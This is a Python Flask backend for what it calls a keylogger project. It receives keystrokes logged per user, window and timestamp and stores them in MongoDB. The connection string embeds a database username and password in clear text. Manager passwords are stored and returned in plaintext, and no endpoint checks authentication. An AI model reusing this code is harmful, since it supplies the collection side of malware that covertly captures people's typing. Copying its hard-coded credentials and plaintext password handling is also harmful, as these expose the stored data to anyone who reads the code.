from flask import request, jsonify
from pymongo import MongoClient

client = MongoClient(
    "mongodb+srv://haimassraf:Aa123456@cluster0.s8vwr.mongodb.net/?retryWrites=true&w=majority&appName=Cluster0")
db = client["key_loger_project"]
data_collection = db["data"]
managers_collection = db["managers"]


def get_data():
    users = list(data_collection.find({}, {"_id": 0}))
    return jsonify(users), 200


def add_data():
    try:
        data = request.json
        for user, windows in data.items():
            for window, timestamps in windows.items():
                existing_entry = data_collection.find_one({"user": user, "window": window})
                if existing_entry:
                    for timestamp, value in timestamps.items():
                        new_value = existing_entry["timestamps"].get(timestamp, "") + value
                        data_collection.update_one(
                            {"user": user, "window": window},
                            {"$set": {f"timestamps.{timestamp}": new_value}}
                        )
                else:
                    data_collection.insert_one({
                        "user": user,
                        "window": window,
                        "timestamps": timestamps
                    })

        updated_data = data_collection.find_one({"user": user, "window": window}, {"_id": 0})
        return jsonify({"message": "Data updated successfully!", "Updated data": updated_data}), 201

    except Exception as err:
        return jsonify({"error": str(err)}), 500


def get_managers():
    managers = list(managers_collection.find({}, {"_id": 0}))
    return jsonify(managers), 200


def add_manager():
    try:
        new_manager = request.json
        if managers_collection.find_one({"user_name": new_manager['user_name']}):
            return jsonify({"error": "Manager already exists!"}), 400

        if managers_collection.find_one({"email": new_manager['email']}):
            return jsonify({"error": "Email already exists!"}), 400

        managers_collection.insert_one({
            "user_name": new_manager['user_name'],
            "password": new_manager['password'],
            "email": new_manager['email']
        })

        return jsonify({"message": "Manager added successfully!", "new_manager": {
            "user_name": new_manager['user_name'],
            "password": new_manager['password'],
            "email": new_manager['email']
        }}), 201

    except Exception as err:
        return jsonify({"error": str(err)}), 500

def update_manager(user_name):
    try:
        data = request.json
        manager = managers_collection.find_one({"user_name": user_name})

        if not manager:
            return jsonify({"error": "Manager not found!"}), 404

        update_fields = {}

        # בדיקה אם יש עדכון לשם המשתמש
        if "user_name" in data and data["user_name"] != user_name:
            existing_manager = managers_collection.find_one({"user_name": data["user_name"]})
            if existing_manager:
                return jsonify({"error": "Username already exists!"}), 400
            update_fields["user_name"] = data["user_name"]

        # בדיקה אם יש עדכון לאימייל
        if "email" in data:
            existing_email = managers_collection.find_one({"email": data["email"], "user_name": {"$ne": user_name}})
            if existing_email:
                return jsonify({"error": "Email already exists!"}), 400
            update_fields["email"] = data["email"]

        # בדיקה אם יש עדכון לסיסמה
        if "password" in data:
            update_fields["password"] = data["password"]

        if not update_fields:
            return jsonify({"message": "No fields to update"}), 400

        # עדכון הנתונים במסד הנתונים
        managers_collection.update_one({"user_name": user_name}, {"$set": update_fields})

        # אם שם המשתמש השתנה, עדכן את המשתמש במסד הנתונים מחדש
        updated_user_name = update_fields.get("user_name", user_name)
        updated_manager = managers_collection.find_one({"user_name": updated_user_name}, {"_id": 0})

        return jsonify({"message": "Manager updated successfully!", "updated_manager": updated_manager}), 200

    except Exception as err:
        return jsonify({"error": str(err)}), 500
